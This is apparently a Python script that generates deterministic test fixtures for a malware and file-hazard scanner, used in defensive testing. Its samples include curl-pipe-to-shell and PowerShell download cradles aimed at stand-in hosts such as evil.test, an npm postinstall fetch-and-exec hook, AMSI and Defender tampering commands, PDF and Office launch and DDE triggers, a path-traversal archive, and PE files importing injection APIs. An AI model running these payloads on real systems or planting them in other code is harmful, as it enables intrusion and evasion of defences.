"""
build_fixtures.py — deterministic fixture generator for media-transfer-scan-tool.

Run from the repo root:  python tests/fixtures/build_fixtures.py

Generates the synthetic fixtures consumed by the Pester test suite that are
awkward to ship as committed binaries. Static .whl fixtures with real metadata
(clean_pkg, vulnerable_deps_pkg) are committed directly under corpus/python/.

The PE/ELF builders below are ported from scan-python-packages' fixture
generator so native-binary triage can be tested without shipping opaque blobs.
"""

import gzip
import io
import json
import os
import struct
import random
import tarfile as _tarfile
import zipfile

FIXTURES_DIR = os.path.dirname(__file__)
CORPUS_DIR   = os.path.join(FIXTURES_DIR, 'corpus')
PYTHON_DIR   = os.path.join(CORPUS_DIR, 'python')
NATIVE_DIR   = os.path.join(CORPUS_DIR, 'native')
PYSRC_DIR    = os.path.join(CORPUS_DIR, 'pysource')
NOTEBOOK_DIR = os.path.join(CORPUS_DIR, 'notebook')
DISGUISED_DIR = os.path.join(CORPUS_DIR, 'disguised')
PDF_DIR    = os.path.join(CORPUS_DIR, 'pdf')
OFFICE_DIR = os.path.join(CORPUS_DIR, 'office')
SHELL_DIR  = os.path.join(CORPUS_DIR, 'shell')
PS_DIR     = os.path.join(CORPUS_DIR, 'powershell')
NPM_DIR    = os.path.join(CORPUS_DIR, 'npm')
PYREQ_DIR  = os.path.join(CORPUS_DIR, 'python_requirements')
NUGET_DIR  = os.path.join(CORPUS_DIR, 'nuget')
MODEL_DIR  = os.path.join(CORPUS_DIR, 'model')
ARCHIVE_DIR = os.path.join(CORPUS_DIR, 'archive')
ARCMEM_DIR  = os.path.join(CORPUS_DIR, 'archive_member')
ARCMETA_DIR = os.path.join(CORPUS_DIR, 'archive_metadata')
PYRULES_DIR = os.path.join(CORPUS_DIR, 'python_rules')
VBA_DIR     = os.path.join(CORPUS_DIR, 'vba')
os.makedirs(PYTHON_DIR, exist_ok=True)
os.makedirs(NATIVE_DIR, exist_ok=True)
os.makedirs(PYSRC_DIR, exist_ok=True)
os.makedirs(NOTEBOOK_DIR, exist_ok=True)
os.makedirs(DISGUISED_DIR, exist_ok=True)
os.makedirs(PDF_DIR, exist_ok=True)
os.makedirs(OFFICE_DIR, exist_ok=True)
os.makedirs(SHELL_DIR, exist_ok=True)
os.makedirs(PS_DIR, exist_ok=True)
for sub in ('clean', 'malicious', 'js', 'tarball', 'locked'):
    os.makedirs(os.path.join(NPM_DIR, sub), exist_ok=True)
for sub in ('clean', 'unpinned', 'vulnerable', 'hash_pinned'):
    os.makedirs(os.path.join(PYREQ_DIR, sub), exist_ok=True)
for sub in ('clean', 'vulnerable', 'collide/a', 'collide/b', 'ambiguous', 'nested_decoy',
            'multi_metadata', 'duplicate_id', 'missing_version'):
    os.makedirs(os.path.join(NUGET_DIR, sub), exist_ok=True)
os.makedirs(MODEL_DIR, exist_ok=True)
os.makedirs(ARCHIVE_DIR, exist_ok=True)
os.makedirs(ARCMEM_DIR, exist_ok=True)
os.makedirs(ARCMETA_DIR, exist_ok=True)
os.makedirs(PYRULES_DIR, exist_ok=True)
os.makedirs(VBA_DIR, exist_ok=True)

RANDOM_SEED   = 13371337
FIXED_ZIP_DT  = (2026, 1, 1, 0, 0, 0)
FIXED_EPOCH   = 1767225600   # 2026-01-01 UTC, for deterministic tar mtimes


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────
def seeded_bytes(label: str, length: int) -> bytes:
    rng = random.Random(f"{RANDOM_SEED}:{label}")
    return bytes(rng.randrange(0, 256) for _ in range(length))


def align(value: int, boundary: int) -> int:
    return ((value + boundary - 1) // boundary) * boundary


def make_minimal_pe(imports=None, sections=None) -> bytes:
    """Build a minimal-but-valid 32-bit PE image (parseable by pefile)."""
    imports = imports or {}
    section_alignment = 0x1000
    file_alignment = 0x200
    image_base = 0x400000
    header_size = 0x200

    section_defs = []
    raw_ptr = header_size
    virtual_addr = 0x1000
    base_sections = sections or [(".text", b"\xC3" + b"\x90" * 63)]

    for name, data in base_sections:
        raw = data.ljust(align(len(data), file_alignment), b"\x00")
        chars = 0x60000020 if name == ".text" else 0x40000040
        section_defs.append({"name": name, "data": raw, "virtual_size": len(data),
                             "virtual_addr": virtual_addr, "raw_ptr": raw_ptr, "chars": chars})
        raw_ptr += len(raw)
        virtual_addr += align(max(len(data), 1), section_alignment)

    import_rva = 0
    import_size = 0
    if imports:
        rdata_rva = virtual_addr
        descriptor_count = len(imports) + 1
        cursor = descriptor_count * 20
        dll_records = []
        rdata = bytearray(b"\x00" * cursor)
        for dll, funcs in sorted(imports.items()):
            cursor = align(cursor, 4)
            ilt_off = cursor
            cursor += 4 * (len(funcs) + 1)
            iat_off = cursor
            cursor += 4 * (len(funcs) + 1)
            name_off = cursor
            dll_bytes = dll.encode("ascii") + b"\x00"
            cursor += len(dll_bytes)
            hint_offsets = []
            for func in funcs:
                cursor = align(cursor, 2)
                hint_offsets.append(cursor)
                cursor += 2 + len(func.encode("ascii")) + 1
            if len(rdata) < cursor:
                rdata.extend(b"\x00" * (cursor - len(rdata)))
            rdata[name_off:name_off + len(dll_bytes)] = dll_bytes
            for index, func in enumerate(funcs):
                hint_name_rva = rdata_rva + hint_offsets[index]
                struct.pack_into("<I", rdata, ilt_off + index * 4, hint_name_rva)
                struct.pack_into("<I", rdata, iat_off + index * 4, hint_name_rva)
                func_bytes = func.encode("ascii") + b"\x00"
                struct.pack_into("<H", rdata, hint_offsets[index], 0)
                start = hint_offsets[index] + 2
                rdata[start:start + len(func_bytes)] = func_bytes
            dll_records.append((rdata_rva + ilt_off, rdata_rva + name_off, rdata_rva + iat_off))
        for index, (ilt_rva, name_rva, iat_rva) in enumerate(dll_records):
            struct.pack_into("<IIIII", rdata, index * 20, ilt_rva, 0, 0, name_rva, iat_rva)
        import_rva = rdata_rva
        import_size = descriptor_count * 20
        rdata_bytes = bytes(rdata)
        section_defs.append({"name": ".rdata",
                             "data": rdata_bytes.ljust(align(len(rdata_bytes), file_alignment), b"\x00"),
                             "virtual_size": len(rdata_bytes), "virtual_addr": rdata_rva,
                             "raw_ptr": raw_ptr, "chars": 0x40000040})
        raw_ptr += align(len(rdata_bytes), file_alignment)
        virtual_addr += align(max(len(rdata_bytes), 1), section_alignment)

    size_of_image = align(virtual_addr, section_alignment)
    dos = bytearray(0x80)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x80)
    coff = struct.pack("<HHIIIHH", 0x14C, len(section_defs), 0, 0, 0, 224, 0x210E)
    optional = bytearray(224)
    struct.pack_into("<HBBIII", optional, 0, 0x10B, 14, 0, 0x200, 0, 0)
    struct.pack_into("<III", optional, 16, 0x1000, 0x1000, 0)
    struct.pack_into("<III", optional, 28, image_base, section_alignment, file_alignment)
    struct.pack_into("<HHHHHH", optional, 40, 6, 0, 0, 0, 6, 0)
    struct.pack_into("<I", optional, 56, size_of_image)
    struct.pack_into("<I", optional, 60, header_size)
    struct.pack_into("<H", optional, 68, 3)
    struct.pack_into("<III", optional, 72, 0x100000, 0x1000, 0x100000)
    struct.pack_into("<II", optional, 84, 0x1000, 0)
    struct.pack_into("<I", optional, 92, 16)
    struct.pack_into("<II", optional, 104, import_rva, import_size)

    section_headers = bytearray()
    for section in section_defs:
        name = str(section["name"]).encode("ascii")[:8].ljust(8, b"\x00")
        data = section["data"]
        section_headers.extend(struct.pack("<8sIIIIIIHHI", name, int(section["virtual_size"]),
                               int(section["virtual_addr"]), len(data), int(section["raw_ptr"]),
                               0, 0, 0, 0, int(section["chars"])))

    headers = (bytes(dos) + b"PE\x00\x00" + coff + bytes(optional) + bytes(section_headers)).ljust(header_size, b"\x00")
    image = bytearray(headers)
    for section in section_defs:
        start = int(section["raw_ptr"])
        data = section["data"]
        if len(image) < start:
            image.extend(b"\x00" * (start - len(image)))
        image[start:start + len(data)] = data
    return bytes(image)


def make_packed_pe() -> bytes:
    """PE with a high-entropy section (triggers BINARY-HIGH-ENTROPY)."""
    return make_minimal_pe(sections=[(".text", b"\xC3" + b"\x90" * 63),
                                     (".packed", seeded_bytes("packed-pe", 1024))])


def make_wheel(pkg: str, version: str, internal: dict,
               requires: list[str] | None = None) -> bytes:
    """Build a .whl (zip) containing the given internal files + a dist-info METADATA."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        for arcname, data in sorted(internal.items()):
            zi = zipfile.ZipInfo(arcname, date_time=FIXED_ZIP_DT)
            z.writestr(zi, data)
        meta = f"Metadata-Version: 2.1\nName: {pkg}\nVersion: {version}\n"
        for requirement in requires or []:
            meta += f"Requires-Dist: {requirement}\n"
        zi = zipfile.ZipInfo(f"{pkg}-{version}.dist-info/METADATA", date_time=FIXED_ZIP_DT)
        z.writestr(zi, meta)
    return buf.getvalue()


def make_nupkg_ambiguous(first_id, first_ver, second_id, second_ver) -> bytes:
    """Build a .nupkg with TWO root .nuspec files -- a real NuGet client refuses
    to load this (PackageArchiveReader.GetNuspecFile() requires exactly one), so
    the scanner must not silently pick one and audit the wrong identity."""
    def nuspec_xml(pkg_id, version):
        return (
            '<?xml version="1.0" encoding="utf-8"?>\n'
            '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">\n'
            '  <metadata>\n'
            f'    <id>{pkg_id}</id>\n'
            f'    <version>{version}</version>\n'
            '    <authors>fixture</authors>\n'
            '  </metadata>\n'
            '</package>\n'
        )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr(zipfile.ZipInfo(f'{first_id}.nuspec', date_time=FIXED_ZIP_DT), nuspec_xml(first_id, first_ver))
        z.writestr(zipfile.ZipInfo(f'{second_id}.nuspec', date_time=FIXED_ZIP_DT), nuspec_xml(second_id, second_ver))
    return buf.getvalue()


def make_nupkg_nested_decoy(decoy_id, decoy_ver, real_id, real_ver) -> bytes:
    """Build a .nupkg with a SINGLE root .nuspec (passes the multi-nuspec
    ambiguity check), but a decoy <metadata> block nested inside a wrapper
    element ahead of the real <package><metadata>. A document-wide '//' XPath
    search (the pre-fix approach) matches <metadata> in document order and
    resolves to the decoy's identity; the fix scopes the lookup to <package>'s
    direct-child <metadata> only, so this must resolve to the REAL identity."""
    nuspec = (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">\n'
        '  <decoyWrapper>\n'
        '    <metadata>\n'
        f'      <id>{decoy_id}</id>\n'
        f'      <version>{decoy_ver}</version>\n'
        '    </metadata>\n'
        '  </decoyWrapper>\n'
        '  <metadata>\n'
        f'    <id>{real_id}</id>\n'
        f'    <version>{real_ver}</version>\n'
        '  </metadata>\n'
        '</package>\n'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        zi = zipfile.ZipInfo(f'{real_id}.nuspec', date_time=FIXED_ZIP_DT)
        z.writestr(zi, nuspec)
    return buf.getvalue()


def make_nupkg_raw_nuspec(nuspec_xml: str, nuspec_filename: str) -> bytes:
    """Build a .nupkg with a single, ARBITRARY-content root .nuspec -- for
    exercising the fail-closed shape checks directly (multiple <metadata>,
    duplicate/missing <id>/<version>) rather than only the specific decoy
    scenario above."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        zi = zipfile.ZipInfo(nuspec_filename, date_time=FIXED_ZIP_DT)
        z.writestr(zi, nuspec_xml)
    return buf.getvalue()


def make_nupkg_without_nuspec() -> bytes:
    """Build a .nupkg carrying NO .nuspec — must report a coverage gap, and must
    never inherit a same-named package's manifest from a shared staging dir."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        zi = zipfile.ZipInfo('readme.txt', date_time=FIXED_ZIP_DT)
        z.writestr(zi, 'This package deliberately ships no .nuspec.\n')
    return buf.getvalue()


def make_nupkg(pkg_id: str, version: str) -> bytes:
    """Build a minimal .nupkg (zip) containing just a top-level .nuspec."""
    nuspec = (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">\n'
        '  <metadata>\n'
        f'    <id>{pkg_id}</id>\n'
        f'    <version>{version}</version>\n'
        '    <authors>fixture</authors>\n'
        '    <description>deterministic test fixture — not a real package</description>\n'
        '  </metadata>\n'
        '</package>\n'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        zi = zipfile.ZipInfo(f'{pkg_id}.nuspec', date_time=FIXED_ZIP_DT)
        z.writestr(zi, nuspec)
    return buf.getvalue()


def write(path: str, data: bytes) -> None:
    with open(path, 'wb') as f:
        f.write(data)
    print(f'  wrote {path}')


def write_tgz(path: str, members: list[tuple[str, bytes]]) -> None:
    """Write a reproducible gzip-compressed tar archive."""
    with open(path, 'wb') as raw:
        # tarfile.open(..., 'w:gz') fixes member mtimes but not the gzip-header
        # mtime. Supplying the gzip layer explicitly keeps the entire file stable.
        with gzip.GzipFile(filename='', mode='wb', fileobj=raw,
                           compresslevel=9, mtime=FIXED_EPOCH) as gz:
            with _tarfile.open(fileobj=gz, mode='w', format=_tarfile.PAX_FORMAT) as tf:
                for name, data in members:
                    info = _tarfile.TarInfo(name)
                    info.size = len(data)
                    info.mtime = FIXED_EPOCH
                    info.mode = 0o644
                    info.uid = info.gid = 0
                    info.uname = info.gname = ''
                    tf.addfile(info, io.BytesIO(data))
    print(f'  wrote {path}')


def make_tgz_bytes(members: list[tuple[str, bytes]]) -> bytes:
    """Return a reproducible gzip-compressed tar archive as bytes."""
    raw = io.BytesIO()
    with gzip.GzipFile(filename='', mode='wb', fileobj=raw,
                       compresslevel=9, mtime=FIXED_EPOCH) as gz:
        with _tarfile.open(fileobj=gz, mode='w', format=_tarfile.PAX_FORMAT) as tf:
            for name, data in members:
                info = _tarfile.TarInfo(name)
                info.size = len(data)
                info.mtime = FIXED_EPOCH
                info.mode = 0o644
                info.uid = info.gid = 0
                info.uname = info.gname = ''
                tf.addfile(info, io.BytesIO(data))
    return raw.getvalue()


def write_tar(path: str, members: list[tuple[str, bytes]]) -> None:
    """Write a reproducible uncompressed tar archive."""
    with _tarfile.open(path, mode='w', format=_tarfile.PAX_FORMAT) as tf:
        for name, data in members:
            info = _tarfile.TarInfo(name)
            info.size = len(data)
            info.mtime = FIXED_EPOCH
            info.mode = 0o644
            info.uid = info.gid = 0
            info.uname = info.gname = ''
            tf.addfile(info, io.BytesIO(data))
    print(f'  wrote {path}')


# ─────────────────────────────────────────────────────────────────────────────
# Python-archive hazard fixtures
# ─────────────────────────────────────────────────────────────────────────────
write(os.path.join(PYTHON_DIR, 'corrupt_pkg-1.0-py3-none-any.whl'),
      b'This is not a ZIP file\x00\x01\x02\x03')

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('safe/file.py', 'x = 1\n')
    z.writestr('../../../evil.py', 'import os; os.system("echo pwned")\n')
write(os.path.join(PYTHON_DIR, 'traversal_pkg-1.0-py3-none-any.whl'), buf.getvalue())

# ─────────────────────────────────────────────────────────────────────────────
# Native-binary fixtures (wheels containing .pyd binaries)
# ─────────────────────────────────────────────────────────────────────────────
# Clean PE .pyd — baseline, expect no binary findings
write(os.path.join(NATIVE_DIR, 'native_clean_pkg-1.0-py3-none-any.whl'),
      make_wheel('native_clean_pkg', '1.0', {
          'native_clean_pkg/__init__.py': b'pass\n',
          'native_clean_pkg/ext.pyd': make_minimal_pe(imports={'kernel32.dll': ['GetModuleHandleA']}),
      }))

# Suspicious imports — process-injection APIs (expect BINARY-SUSPICIOUS-IMPORT HIGH)
write(os.path.join(NATIVE_DIR, 'suspicious_imports_pkg-1.0-py3-none-any.whl'),
      make_wheel('suspicious_imports_pkg', '1.0', {
          'suspicious_imports_pkg/__init__.py': b'pass\n',
          'suspicious_imports_pkg/payload.pyd': make_minimal_pe(
              imports={'kernel32.dll': ['CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory']}),
      }))

# Network import — ws2_32.dll (expect BINARY-NETWORK-IMPORT MEDIUM)
write(os.path.join(NATIVE_DIR, 'network_native_pkg-1.0-py3-none-any.whl'),
      make_wheel('network_native_pkg', '1.0', {
          'network_native_pkg/__init__.py': b'pass\n',
          'network_native_pkg/net.pyd': make_minimal_pe(imports={'ws2_32.dll': ['connect', 'send', 'recv']}),
      }))

# Fake .pyd — not a real PE (expect BINARY-INVALID-FORMAT HIGH)
write(os.path.join(NATIVE_DIR, 'fake_native_pkg-1.0-py3-none-any.whl'),
      make_wheel('fake_native_pkg', '1.0', {
          'fake_native_pkg/__init__.py': b'pass\n',
          'fake_native_pkg/fake.pyd': seeded_bytes('fake-pyd', 64),
      }))

# ─────────────────────────────────────────────────────────────────────────────
# Loose Python source fixtures (for Bandit + detect-secrets, deep tier)
# Secret-like strings are ASSEMBLED FROM FRAGMENTS so this generator file does
# not itself trip GitHub push-protection / secret scanning.
# ─────────────────────────────────────────────────────────────────────────────
clean_py = (
    '"""Benign module — no risky calls, no secrets."""\n'
    'def add(a, b):\n'
    '    return a + b\n'
)
write_text = lambda p, s: (open(p, 'w', encoding='utf-8', newline='\n').write(s), print(f'  wrote {p}'))[1]


def write_text_checkout(path: str, text: str) -> None:
    """Write tracked text using the checkout platform's configured newline."""
    with open(path, 'w', encoding='utf-8', newline=None) as f:
        f.write(text)
    print(f'  wrote {path}')
write_text(os.path.join(PYSRC_DIR, 'clean.py'), clean_py)

# Risky code — Bandit B307 (eval, MEDIUM) + B602 (subprocess shell=True, HIGH)
risky_py = (
    'import subprocess\n'
    'def run(user_input, cmd):\n'
    '    eval(user_input)\n'
    '    subprocess.Popen(cmd, shell=True)\n'
)
write_text(os.path.join(PYSRC_DIR, 'risky.py'), risky_py)

# Secrets — assembled so the literals never appear whole in this file.
aws_key = 'AKIA' + 'QWERTYUIOP123456'                       # AWS key format: AKIA + 16
pem_hdr = '-----BEGIN ' + 'RSA PRIVATE KEY' + '-----'        # PrivateKeyDetector trigger
secrets_py = (
    '# Deterministic fixture with fake credentials (not real).\n'
    f'aws_access_key = "{aws_key}"\n'
    f'private_key = "{pem_hdr}\\nMIIBfake/not/a/real/key==\\n"\n'
)
write_text(os.path.join(PYSRC_DIR, 'secrets.py'), secrets_py)

# ─────────────────────────────────────────────────────────────────────────────
# PythonRules (core middle-tier) fixtures — curated high-signal indicators.
# These exercise the AST helper scan_python.py: per-call rules + combinations.
# ─────────────────────────────────────────────────────────────────────────────
# Clean: imports and uses subprocess SAFELY (no shell=True) + benign logic.
pyr_clean = (
    '"""Benign utility — no high-signal indicators."""\n'
    'import subprocess\n'
    'def list_dir(path):\n'
    '    return subprocess.run(["ls", path], capture_output=True)\n'
    'def add(a, b):\n'
    '    return a + b\n'
)
write_text(os.path.join(PYRULES_DIR, 'pyr_clean.py'), pyr_clean)

# Malicious: eval + os.system + subprocess shell=True + pickle.loads, plus a
# download-and-run combo (urlopen -> base64 decode -> eval).
pyr_evil = (
    'import os, base64, subprocess\n'
    'import pickle as pk\n'
    'from urllib.request import urlopen\n'
    'def stage(url):\n'
    '    blob = urlopen(url).read()\n'
    '    payload = base64.b64decode(blob)\n'
    '    eval(payload)\n'                     # PY-EVAL + PY-DECODE-EXEC + PY-DOWNLOAD-EXEC
    '    os.system("id")\n'                   # PY-OS-SYSTEM
    '    subprocess.Popen("sh -i", shell=True)\n'  # PY-SUBPROCESS-SHELL
    '    return pk.loads(payload)\n'          # PY-PICKLE-LOAD
)
write_text(os.path.join(PYRULES_DIR, 'pyr_malicious.py'), pyr_evil)

# Negative control for false positives: the trigger words appear only inside a
# string literal and a comment — the AST scanner must NOT flag these.
pyr_strings = (
    '"""Doc mentions eval() and os.system() but never calls them."""\n'
    'NOTE = "do not use eval or os.system here"\n'
    '# pickle.loads is dangerous; this line is just a comment\n'
    'def safe():\n'
    '    return len(NOTE)\n'
)
write_text(os.path.join(PYRULES_DIR, 'pyr_strings.py'), pyr_strings)

# ─────────────────────────────────────────────────────────────────────────────
# Jupyter notebook fixtures (.ipynb — JSON, never executed by the scanner)
# ─────────────────────────────────────────────────────────────────────────────
def notebook(cells):
    return json.dumps({"cells": cells, "metadata": {}, "nbformat": 4, "nbformat_minor": 5}, indent=1)

def code_cell(src, outputs=None):
    return {"cell_type": "code", "execution_count": None, "metadata": {},
            "source": src, "outputs": outputs or []}

# Clean notebook — benign code cell, no outputs
write_text(os.path.join(NOTEBOOK_DIR, 'nb_clean.ipynb'),
           notebook([code_cell(["x = 1 + 1\n", "print(x)\n"])]))

# Eval notebook — risky code cell (Bandit flags via projection under -Profile full)
write_text(os.path.join(NOTEBOOK_DIR, 'nb_eval.ipynb'),
           notebook([code_cell(["user = 'data'\n", "eval(user)\n"])]))

# Outputs notebook — code cell with saved outputs (NOTEBOOK-SAVED-OUTPUT)
write_text(os.path.join(NOTEBOOK_DIR, 'nb_outputs.ipynb'),
           notebook([code_cell(["print('hi')\n"],
                     outputs=[{"output_type": "stream", "name": "stdout", "text": ["hi\n"]}])]))

# Malformed notebook — valid JSON but no cells array (NOTEBOOK-MALFORMED)
write_text(os.path.join(NOTEBOOK_DIR, 'nb_malformed.ipynb'),
           json.dumps({"not_cells": [], "nbformat": 4}))

# ─────────────────────────────────────────────────────────────────────────────
# Disguised scripts (v0.2) — real scripts under innocent extensions, NO shebang,
# so detection must come from content signatures (signal #3).
# ─────────────────────────────────────────────────────────────────────────────
# PowerShell downloader disguised as .txt (classic evasion)
write_text(os.path.join(DISGUISED_DIR, 'readme.txt'),
    "[CmdletBinding()]\nparam($Url)\n"
    "$wc = New-Object System.Net.WebClient\n"
    "Invoke-Expression ($wc.DownloadString('http://example.test/p'))\n"
    "Write-Host 'done'\n")

# Bash script disguised as .log
write_text(os.path.join(DISGUISED_DIR, 'output.log'),
    "if [ -f /etc/passwd ]; then\n"
    "  export TOKEN=abc\n"
    "  curl http://example.test/x | bash\n"
    "fi\n"
    "echo done\n")

# Python disguised as .dat
write_text(os.path.join(DISGUISED_DIR, 'data.dat'),
    "import os\n"
    "import subprocess\n"
    "def run():\n"
    "    os.system('id')\n"
    "if __name__ == '__main__':\n"
    "    run()\n")

# Batch disguised as .txt
write_text(os.path.join(DISGUISED_DIR, 'notes2.txt'),
    "@echo off\n"
    "setlocal\n"
    "set TARGET=%USERPROFILE%\n"
    "goto end\n"
    ":end\n")

# Negative control — plain English prose, must NOT be flagged disguised
write_text(os.path.join(DISGUISED_DIR, 'memo.txt'),
    "This is a plain text memo about the project status.\n"
    "We import lessons from past work and define our goals for next quarter.\n"
    "Please print this document and review it before the meeting.\n")

# ─────────────────────────────────────────────────────────────────────────────
# PDF fixtures (v0.3) — minimal PDFs carrying the trigger keywords. The scanner
# does keyword triage on raw bytes, so these need not be fully renderable.
# ─────────────────────────────────────────────────────────────────────────────
def write_pdf(name: str, body: str) -> None:
    content = "%PDF-1.7\n1 0 obj\n<< " + body + " >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"
    write_text(os.path.join(PDF_DIR, name), content)

write_pdf('pdf_clean.pdf',    "/Type /Catalog /Pages 2 0 R")
write_pdf('pdf_js.pdf',       "/Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert\\('x'\\);) >>")
write_pdf('pdf_launch.pdf',   "/Type /Catalog /OpenAction << /S /Launch /F (cmd.exe) >>")
write_pdf('pdf_embedded.pdf', "/Type /Catalog /Names << /EmbeddedFiles 3 0 R >> /EmbeddedFile 4 0 R")
write_pdf('pdf_encrypted.pdf',"/Type /Catalog /Encrypt 5 0 R")
# Obfuscated /JavaScript via PDF name hex escapes (/#4A#61...) — must still be caught
write_pdf('pdf_obfuscated.pdf', "/Type /Catalog /OpenAction << /S /#4A#61#76#61#53#63#72#69#70#74 >>")
# Disguised: .pdf extension but not a real PDF
write_text(os.path.join(PDF_DIR, 'pdf_fake.pdf'), "this is not really a pdf file at all\n")

# ─────────────────────────────────────────────────────────────────────────────
# Office (OOXML) fixtures (v0.3) — minimal zips exercising the stdlib checks.
# ─────────────────────────────────────────────────────────────────────────────
_CONTENT_TYPES = ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                  'package/2006/content-types">'
                  '<Default Extension="xml" ContentType="application/xml"/></Types>')

def write_docx(name: str, document_xml: str, extra: dict | None = None) -> None:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr(zipfile.ZipInfo('[Content_Types].xml', FIXED_ZIP_DT), _CONTENT_TYPES)
        z.writestr(zipfile.ZipInfo('word/document.xml', FIXED_ZIP_DT), document_xml)
        for arc, data in sorted((extra or {}).items()):
            z.writestr(zipfile.ZipInfo(arc, FIXED_ZIP_DT), data)
    write(os.path.join(OFFICE_DIR, name), buf.getvalue())   # bytes, not text

_DOC_BODY = '<?xml version="1.0"?><w:document xmlns:w="x"><w:body><w:p/></w:body></w:document>'

# Clean — no macros, DDE, or template
write_docx('office_clean.docx', _DOC_BODY)

# Macro-enabled — contains a vbaProject.bin (presence check fires; bytes are fake)
write_docx('office_macro.docm', _DOC_BODY,
           {'word/vbaProject.bin': seeded_bytes('vba', 256)})

# DDEAUTO field in the main document part
write_docx('office_dde.docx',
           '<?xml version="1.0"?><w:document xmlns:w="x"><w:body>'
           '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/></w:p>'
           '</w:body></w:document>')

# Remote-template injection — external attachedTemplate in settings rels
write_docx('office_template.docx', _DOC_BODY, {
    'word/settings.xml': '<?xml version="1.0"?><w:settings xmlns:w="x"/>',
    'word/_rels/settings.xml.rels':
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
        'package/2006/relationships"><Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="http://evil.test/template.dotm" TargetMode="External"/></Relationships>',
})

# ─────────────────────────────────────────────────────────────────────────────
# Shell script fixtures (v0.4)
# ─────────────────────────────────────────────────────────────────────────────
write_text(os.path.join(SHELL_DIR, 'clean.sh'),
    '#!/bin/bash\n'
    'set -euo pipefail\n'
    'name="$1"\n'
    'echo "Hello, ${name}"\n')

write_text(os.path.join(SHELL_DIR, 'remote_exec.sh'),
    '#!/bin/bash\n'
    'curl https://example.test/install.sh | bash\n')

write_text(os.path.join(SHELL_DIR, 'b64_exec.sh'),
    '#!/bin/bash\n'
    'echo "cGF5bG9hZAo=" | base64 -d | bash\n')

write_text(os.path.join(SHELL_DIR, 'eval_expand.sh'),
    '#!/bin/bash\n'
    'USER_INPUT="$1"\n'
    'eval "$USER_INPUT"\n')

write_text(os.path.join(SHELL_DIR, 'chmod777.sh'),
    '#!/bin/bash\n'
    'chmod 777 /tmp/payload\n'
    './tmp/payload\n')

write_text(os.path.join(SHELL_DIR, 'hardcoded_ip.sh'),
    '#!/bin/bash\n'
    'SERVER=192.168.1.100\n'
    'curl http://$SERVER/data\n')

# sc_bugs.sh — shell code ShellCheck RELIABLY flags as errors/warnings:
#   SC2086: unquoted variable in echo and test
#   SC2050: comparing string with -eq
#   SC2006: use $(...) instead of backticks
write_text(os.path.join(SHELL_DIR, 'sc_bugs.sh'),
    '#!/bin/bash\n'
    'var="hello world"\n'
    'echo $var\n'                     # SC2086: double quote to prevent globbing
    'count=`ls | wc -l`\n'            # SC2006: use $(...) not backticks
    'if [ "$count" -eq 0 ]; then\n'
    '  echo "empty"\n'
    'fi\n')

# ─────────────────────────────────────────────────────────────────────────────
# PowerShell fixtures (v0.5)
# ─────────────────────────────────────────────────────────────────────────────
write_text(os.path.join(PS_DIR, 'clean.ps1'),
    '[CmdletBinding()]\n'
    'param([Parameter(Mandatory)][string]$Name)\n'
    'Write-Output "Hello, $Name"\n')

# Classic offensive-PowerShell downloader cradle: IEX + DownloadString
write_text(os.path.join(PS_DIR, 'downloader.ps1'),
    '$wc = New-Object System.Net.WebClient\n'
    "IEX ($wc.DownloadString('http://example.test/payload.ps1'))\n")

# Encoded command + hidden window
write_text(os.path.join(PS_DIR, 'encoded.ps1'),
    'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand '
    'aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQA=\n')

# Base64 decode + AMSI tampering
write_text(os.path.join(PS_DIR, 'amsi.ps1'),
    "$data = [System.Convert]::FromBase64String('cABheWxvYWQ=')\n"
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n")

# Defender tampering
write_text(os.path.join(PS_DIR, 'defender.ps1'),
    'Add-MpPreference -ExclusionPath "C:\\\\temp\\\\payload"\n'
    'Set-MpPreference -DisableRealtimeMonitoring $true\n')

# ─────────────────────────────────────────────────────────────────────────────
# npm fixtures (v0.6)
# ─────────────────────────────────────────────────────────────────────────────
# Clean package.json — only normal scripts, no install hooks
write_text(os.path.join(NPM_DIR, 'clean', 'package.json'),
    json.dumps({"name": "clean-pkg", "version": "1.0.0",
                "scripts": {"build": "tsc", "test": "jest"}}, indent=2))

# Malicious package.json — postinstall fetch-and-exec (the #1 npm vector)
_malicious_pkg = {
    "name": "evil-pkg", "version": "1.0.0",
    "scripts": {
        "postinstall": "node -e \"require('child_process').exec('curl http://evil.test/x | sh')\"",
        "build": "tsc",
    },
    "bin": {"evil": "./cli.js"},
}
write_text(os.path.join(NPM_DIR, 'malicious', 'package.json'),
           json.dumps(_malicious_pkg, indent=2))

# JavaScript fixtures
write_text(os.path.join(NPM_DIR, 'js', 'evil.js'),
    "const cp = require('child_process');\n"
    "cp.exec('whoami');\n"
